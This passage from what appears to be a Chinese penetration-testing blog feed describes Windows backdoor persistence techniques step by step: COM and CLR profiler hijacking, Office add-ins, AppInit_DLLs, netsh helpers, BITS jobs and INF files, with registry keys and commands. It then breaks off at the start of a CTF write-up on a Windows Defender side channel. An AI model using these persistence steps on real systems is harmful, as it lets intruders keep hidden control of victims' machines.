src="https://xzfile.aliyuncs.com/media/upload/picture/20190929221919-2094e730-e2c4-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>然后在cmd下设置一下：<br><strong> PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序 </strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SETX COR_ENABLE_PROFILING=1 /M</span><br><span class="line">SETX COR_PROFILER={11111111-1111-1111-1111-111111111111} /M</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后执行一波，效果如下，可以看到已经成功劫持了<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190929222618-19c9d3d8-e2c5-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><h2 id="Hijack-CAccPropServicesClass-and-MMDeviceEnumerator"><a href="#Hijack-CAccPropServicesClass-and-MMDeviceEnumerator" class="headerlink" title="Hijack CAccPropServicesClass and MMDeviceEnumerator"></a>Hijack CAccPropServicesClass and MMDeviceEnumerator</h2><p>什么是<code>COM</code>（来自<code>WIKI</code>）<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">组件对象模型（英语：Component Object Model，缩写COM）是微软的一套软件组件的二进制接口标准。这使得跨编程语言的进程间通信、动态对象创建成为可能。COM是多项微软技术与框架的基础，包括OLE、OLE自动化、ActiveX、COM+、DCOM、Windows shell、DirectX、Windows Runtime。</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个和<code>CRL</code>劫持<code>.NET</code>程序类似，也是通过修改<code>CLSID</code>下的注册表键值，实现对<code>CAccPropServicesClass</code>和<code>MMDeviceEnumerator</code>的劫持，而系统很多正常程序启动时需要调用这两个实例，所以这个很适合我们的后门持久化。</p><p>经测试貌似64位系统下不行（或许是我姿势的问题），但是32位系统下可以，下面说一下32位系统利用方法：</p><p>在<code>%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\</code>下放入我们的后门<code>dll</code>，重命名为<code>test._dl</code></p><p>PS：如果<code>Installer</code>文件夹不存在，则依次创建<code>Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001095735-d67385fe-e3ee-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>然后就是修改注册表了，在注册表位置为：<code>HKCU\Software\Classes\CLSID\</code>下创建项<code>{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code>，然后再创建一个子项<code>InprocServer32</code>，默认为我们的<code>dll</code>文件路径：<code>C:\Users\qiyou\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}</code>，再创建一个键<code>ThreadingModel</code>，其键值为：<code>Apartment</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001095821-f245a168-e3ee-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>然后就是测试了，打开<code>iexplore.exe</code>，成功弹框</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001085159-ac9898fe-e3e5-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>PS：<code>{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code>对应<code>CAccPropServicesClass</code>，<code>{BCDE0395-E52F-467C-8E3D-C4579291692E}</code>对应<code>MMDeviceEnumerator</code></p><h2 id="劫持MruPidlList"><a href="#劫持MruPidlList" class="headerlink" title="劫持MruPidlList"></a>劫持MruPidlList</h2><p>在注册表位置为<code>HKCU\Software\Classes\CLSID\</code>下创建项<code>{42aedc87-2188-41fd-b9a3-0c966feabec1}</code>，再创建一个子项<code>InprocServer32</code>，默认的键值为我们的dll路径，再创建一个键<code>ThreadingModel</code>，其键值：<code>Apartment</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001125534-b4008ec2-e407-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>该注册表对应<code>COM</code>对象<code>MruPidlList</code>，作用于<code>shell32.dll</code>，而<code>shell32.dll</code>是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中<code>explorer.exe</code>会调用<code>shell32.dll</code>，然后会加载COM对象<code>MruPidlList</code>，从而触发我们的<code>dll</code>文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001131924-0809de80-e40b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>当用户重启时或者重新创建一个<code>explorer.exe</code>进程时，就会加载我们的恶意dll文件，从而达到后门持久化的效果。这里我们直接结束一个<code>explorer.exe</code>进程再起一个进程来看一下效果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001125010-f2d4a292-e406-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="office系列"><a href="#office系列" class="headerlink" title="office系列"></a>office系列</h2><h3 id="Word-WLL"><a href="#Word-WLL" class="headerlink" title="Word WLL"></a>Word WLL</h3><p>把dll文件保存在<code>%APPDATA%\Microsoft\Word\Startup</code>，然后把后缀名改为<code>wll</code><br>PS：<code>Startup</code>支持启动多个<code>wll</code></p><p>打开<code>word</code>，成功弹框<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001133551-54429768-e40d-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><h3 id="Excel-XLL"><a href="#Excel-XLL" class="headerlink" title="Excel XLL"></a>Excel XLL</h3><p><code>Excel dll</code>的编写可以参考三好师傅这个项目：<a href="https://github.com/3gstudent/Add-Dll-Exports" title="链接" target="_blank" rel="noopener">链接</a><br>用三好师傅powershell脚本生成现成的<code>Excel dll</code>：<a href="https://github.com/3gstudent/Office-Persistence" title="链接" target="_blank" rel="noopener">链接</a></p><p>将生成的DLL文件复制到<code>%appdata%\Microsoft\AddIns</code>目录下，然后再修改一下注册表，<code>office</code>版本对应的注册表位置如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">office2003 — HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\</span><br><span class="line">office2007 — HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\</span><br><span class="line">office2010 — HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\</span><br><span class="line">office2013 — HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\</span><br><span class="line">office2016 — HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\</span><br></pre></td></tr></tbody></table></figure><p>我这里使用的2010的，所以我们要修改的是<code>HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options</code>，添加一个键<code>OPEN</code>，键值为：<code>/R test.dll</code><br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191002103416-20f5a9ee-e4bd-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>然后打开<code>Excel</code>，发现成功弹出计算器<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191002104125-208531fe-e4be-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><h3 id="PowerPoint-VBA-add-ins"><a href="#PowerPoint-VBA-add-ins" class="headerlink" title="PowerPoint VBA add-ins"></a>PowerPoint VBA add-ins</h3><p>用三好师傅powershell脚本生成现成的<code>PowerPoint dll</code>：<a href="https://github.com/3gstudent/Office-Persistence" title="链接" target="_blank" rel="noopener">链接</a></p><p>将生成的DLL文件复制到<code>%appdata%\Microsoft\AddIns</code>目录下，然后参考前面我给出的<code>office</code>版本对应的注册表位置，在<code>HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint</code>下新建一个子项：<code>AddIns</code>，然后在<code>AddIns</code>下面新建一个子项<code>test</code>，新建一个键为<code>Autoload</code>，类型为<code>DWORD</code>，键值为：<code>1</code>；新建一个键为<code>Path</code>，类型为<code>SZ</code>，键值为我们<code>dll</code>文件的路径</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191002105858-943571ac-e4c0-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>打开<code>PowerPoint</code>成功弹出计算器</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191002105242-b402a514-e4bf-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h2><p>什么是文件关联<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系。一个文件可以与多个应用程序发生关联。可以利用文件的“打开方式”进行关联选择。</span><br><span class="line">举个例子来说，位图文件（BMP文件）在Windows中的默认关联程序是“图片”，如果将其默认关联改为用ACDSee程序来打开，那么ACDSee就成了它的默认关联程序。</span><br><span class="line">PS：来自百度百科</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以用<code>assoc</code>命令显示或修改文件扩展名关联，我们可以看一下<code>.txt</code>文件的关联</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001162736-52ffa11c-e425-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>我们可以用<code>ftype</code>命令显示或修改用在文件扩展名关联中的文件类型</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001162853-80bfbde4-e425-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>相关注册表<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Classe    //保存了当前用户的类注册和文件扩展名信息</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classe   //保存了系统所有用户用户的类注册和文件扩展名信息</span><br><span class="line">HKEY_CLASS_ROOT                      //HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们以<code>.txt</code>为例，通过文件关联来修改它默认打开的程序。<br>修改<code>\HKEY_CLASS_ROOT\txtfile\shell\open\command</code>的默认值为我们要执行的程序</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001162337-c48ba0ac-e424-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>效果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001162354-ce321c4e-e424-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h2><p><code>User32.dll</code>被加载到进程时，会读取<code>AppInit_DLLs</code>注册表项，如果有值，调用<code>LoadLibrary() api</code>加载用户dll。</p><p>其注册表位置为：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>，把<code>AppInit_DLLs</code>的键值设置为我们dll路径，将<code>LoadAppInit_DLLs</code>设置为1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001214220-4a922a0a-e451-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>效果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001170559-afad93d8-e42a-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Netsh-helper"><a href="#Netsh-helper" class="headerlink" title="Netsh helper"></a>Netsh helper</h2><p><code>netsh</code>（全称：<code>Network Shell</code>） 是<code>windows</code>系统本身提供的功能强大的网络配置命令行工具，它可以添加自定的dll从而拓展其功能，我们可以使用<code>netsh add helper yourdll.dll</code>来添加拓展功能，添加了之后，在启动<code>netsh</code>的时候就会加载我们dll文件</p><p>添加自定义<code>helper dll</code><br>关于<code>helper dll</code>的编写可以参考这个项目：<a href="https://github.com/outflanknl/NetshHelperBeacon" title="链接" target="_blank" rel="noopener">链接</a></p><p>我们可以使用两种方式来添加helper：</p><ol><li>通过cmd添加helper<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper test.dll</span><br></pre></td></tr></tbody></table></figure></li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001203540-fa73fbe2-e447-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><ol start="2"><li>通过注册表添加helper<br>其位置为：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code>，创建一个键，名称随便，键值为我们dll的路径</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001203821-5a58bf84-e448-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>效果如下：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001202702-c54eb4c6-e446-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><h2 id="利用BITS"><a href="#利用BITS" class="headerlink" title="利用BITS"></a>利用BITS</h2><p><code>BITS</code> (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</p><p><code>bitsadmin</code>是一个命令行工具，用于创建下载或上传任务并监视其进度。你可以执行<code>bitsadmin /?</code>或<code>bitsadmin /HELP</code>获取帮助列表。</p><p>常见的<code>bitsadmin</code>命令<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create [type] DisplayName //创建一个任务</span><br><span class="line">bitsadmin /cancel &lt;Job&gt; //删除一个任务</span><br><span class="line">bitsadmin /list /allusers /verbose //列出所有任务</span><br><span class="line">bitsadmin /AddFile &lt;Job&gt; &lt;RemoteURL&gt; &lt;LocalName&gt; //给任务test添加一个下载文件</span><br><span class="line">bitsadmin /SetNotifyCmdLine &lt;Job&gt; &lt;ProgramName&gt; [ProgramParameters] //设置在任务完成传输时或任务进入状态时将运行的命令行命令。</span><br><span class="line">bitsadmin /Resume &lt;Job&gt; //激活传输队列中的新任务或挂起的任务。</span><br><span class="line">bitsadmin /cancel &lt;Job&gt; //删除某个任务</span><br><span class="line">bitsadmin /reset /allusers //删除所有任务</span><br><span class="line">bitsadmin /complete &lt;Job&gt; //完成某个任务</span><br></pre></td></tr></tbody></table></figure><p></p><p>下面我们来测试一下：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create test</span><br><span class="line">bitsadmin /addfile test c:\windows\system32\calc.exe c:\Users\qiyou\Desktop\calc.exe //为了方便起见我们直接复制本地文件</span><br><span class="line">bitsadmin /SetNotifyCmdLine test cmd.exe "cmd.exe /c calc.exe"</span><br><span class="line">bitsadmin /resume test</span><br></pre></td></tr></tbody></table></figure><p></p><p>效果如下：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001230101-48ae2f94-e45c-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p>重启电脑之后任务还是存在</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001231945-e6861220-e45e-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>重启电脑之后任务会再一次被激活，大概几分钟之后我们的命令会再次执行（由于时间太长了就不录制gif了）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001232648-e24882f0-e45f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>如果我们想让任务完成，可以执行<code>bitsadmin /complete test</code>，<code>calc.exe</code>也会复制到桌面上</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191001232952-5022a8be-e460-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="利用inf文件实现后门"><a href="#利用inf文件实现后门" class="headerlink" title="利用inf文件实现后门"></a>利用inf文件实现后门</h2><p><code>inf</code>文件<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INF文件或安装信息文件是Microsoft Windows用于安装软件和驱动程序的纯文本文件。INF文件最常用于安装硬件组件的设备驱动程序。Windows包含用于创建基于INF的安装的IExpress工具。INF文件是Windows安装程序API及其后续版本Windows Installer的一部分。</span><br><span class="line">PS：来自WIKI</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>inf</code>文件的结构<br>想了解更多可以看一下微软的手册：<code>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. DefaultInstall节（来自WIKI）</span><br><span class="line">INF文件的结构与INI文件的结构非常类似; 它包含用于指定要复制的文件，对注册表的更改等的各个部分。所有INF文件都包含一个[Version]带有Signature 键值对的部分，用于指定INF文件所针对的Windows版本。签名通常是$CHICAGO$（对于Windows 9x）或$WINDOWS NT$（对于Windows NT / 2K / XP）。其余大多数部分是用户定义的，并且包含特定于要安装的组件的信息。</span><br><span class="line"></span><br><span class="line">2. DefaultInstall节（来自微软的手册）</span><br><span class="line">RunPreSetupCommands-本节中指定的命令在安装服务配置文件之前运行。</span><br><span class="line">RunPostSetupCommands-本节中指定的命令在安装程序完成服务配置文件后运行。</span><br><span class="line">RunPreUnInstCommands-本节中指定的命令在卸载程序开始之前运行。</span><br><span class="line">RunPostUnInstCommands-本节中指定的命令在卸载程序运行后运行。</span><br></pre></td></tr></tbody></table></figure><p>下面举一个<code>calc.inf</code>弹计算器的例子<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Version]</span><br><span class="line">Signature="$CHICAGO$"</span><br><span class="line">AdvancedINF=2.5,"test"</span><br><span class="line">[DefaultInstall]</span><br><span class="line">RunPreSetupCommands=Command1</span><br><span class="line">[Command1]</span><br><span class="line">C:\windows\system32\calc.exe</span><br></pre></td></tr></tbody></table></figure><p></p><p>命令行下执行：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe advpack.dll,LaunchINFSection calc.inf,DefaultInstall</span><br></pre></td></tr></tbody></table></figure><p></p><p>效果如下：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191002090015-fe9a4128-e4af-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p>后门实现：<br>在注册表<code>HKEY_CURRENT_USER\Software\Microsoft\</code>处依次新建子项<code>\IEAK\GroupPolicy\PendingGPOs</code>，然后再新建几个键，如下：</p><ol><li><p>键：<code>Count</code>，类型：<code>REG_DWORD</code>，键值：<code>1</code></p></li><li><p>键：<code>Path1</code>，类型：<code>REG_SZ</code>，键值：<code>C:\Users\Administrator\Desktop\test\calc.inf</code> //这个为我们inf文件的路径，这里以上面那个inf文件例子为例</p></li><li><p>键：<code>Section1</code>，类型：<code>REG_SZ</code>，键值：<code>DefaultInstall</code></p></li></ol><p>如下图所示：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191002090940-4f8d53d0-e4b1-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>重启电脑之后成功弹出计算器</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191002090304-636386dc-e4b0-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是重启之后<code>PendingGPOs</code>该项就会被清除，需要我们重新修改注册表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191002091420-f688d38a-e4b1-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>以上就是我所总结后门持久化的所有内容了，当然还有很多方法没有在文章内提及，虽然有的方法都是老生常谈的了，但是还是在一些实战环境中屡试不爽，有一句话说的好（这句话忘记是哪位师傅说的了=。=）：<strong>知识面宽度决定攻击面广度，知识链深度决定攻击链的长度</strong></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://github.com/Ridter/Intranet_Penetration_Tips" title="https://github.com/Ridter/Intranet_Penetration_Tips" target="_blank" rel="noopener">https://github.com/Ridter/Intranet_Penetration_Tips</a></p><p><a href="https://paper.seebug.org/1007/" title="https://paper.seebug.org/1007/" target="_blank" rel="noopener">https://paper.seebug.org/1007/</a></p><p><a href="https://3gstudent.github.io/" title="https://3gstudent.github.io/" target="_blank" rel="noopener">https://3gstudent.github.io/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道CTF题了解Windows-Defender侧信道攻击</title>
      <link href="/2019/09/08/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%BA%86%E8%A7%A3Windows-Defender%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
      <url>/2019/09/08/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%BA%86%E8%A7%A3Windows-Defender%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天打了一下由<code>tokyowesterns</code>举办的TWCTF，感觉phpnote这题还是不错的，一个全新的知识点，比赛的时候没有解出来，赛后问了一下梅子酒才知道这个是用<code>windows-defender</code>测信道攻击，下面记录一下解题过程</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Windows-Defender介绍"><a href="#Windows-Defender介绍" class="headerlink" title="Windows Defender介绍"></a>Windows Defender介绍</h3><blockquote><p>来自WIKI</p></blockquote><p><code>Windows Defender</code>（Windows 10创意者更新后名为<code>Windows Defender Antivirus</code>），曾用名<code>Microsoft AntiSpyware</code>，最初是用来移除、隔离和预防间谍软件的程序，可以运行在Windows XP以及更高版本的操作系统上，并已经内置在<code>Windows Vista</code>以及以后的版本中。<code>Windows Defender</code>的定义库更新很频繁。在Windows 8及之后的系统中取代<code>Microsoft Security Essentials</code>，成为一款全面反病毒软件。</p><h3 id="关于-mpengine-dll"><a href="#关于-mpengine-dll" class="headerlink" title="关于 mpengine.dll"></a>关于 mpengine.dll</h3><p><code>TokyoWesterns</code>在PPT上是这么描述的<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909232234-a61c12ca-d315-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p><code>mpengine.dll</code>是<code>Windows Defender</code>核心的ddl文件，其中它包含了JS引擎，它继承了JS的一些基础语法，其中它支持eval函数，但是它会对eval函数的参数进行检测，如果发现恶意数据则会进行拦截</p><h3 id="Windows-Defender触发机制"><a href="#Windows-Defender触发机制" class="headerlink" title="Windows-Defender触发机制"></a>Windows-Defender触发机制</h3><p>在WCTF2019上<code>TokyoWesterns</code>出了一个关于<code>Windows Defender</code>侧信道攻击的题目，赛后分享的PPT地址为：<a href="https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf" target="_blank" rel="noopener">链接</a></p><p>Defender对文件的检测行为如下（摘自TokyoWesterns的PPT）：<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908221400-e78b2e22-d242-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>所以我们第一步是要找到能触发<code>Windows Defender</code>检测机制的文件，<code>EICAR</code>测试文件可以做到这一点，关于EICAR测试文件的解释如下（<a href="http://docs.trendmicro.com/all/ent/de/v1.5/zh-cn/de_1.5_olh/ctm_ag/ctm1_ag_ch8/t_test_eicar_file.htm" target="_blank" rel="noopener">参考链接</a>）：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">欧洲计算机防病毒研究所 (EICAR) 开发了一种测试病毒，可用于测试您的防病毒设备。此脚本是一个惰性文本文件。二进制特征码包含在多数防病毒产品供应商的病毒码文件中。它本质上不是病毒，并且不包含任何程序代码。</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以从上面的参考链接中下载到这样的一个EICAR测试文件<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后我们在本地测试一下看看会不会拦截<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908214839-5cd883ea-d23f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>可以明显看到被拦截了，但是如果把这个字符破坏掉就不会被拦截，所以我们可以利用<code>Windows Defender</code>这一点来进行侧信道攻击</p><h2 id="phpnote"><a href="#phpnote" class="headerlink" title="phpnote"></a>phpnote</h2><p>从注释中得到<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://phpnote.chal.ctf.westerns.tokyo/?action=source</span><br></pre></td></tr></tbody></table></figure><p></p><p>源码<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 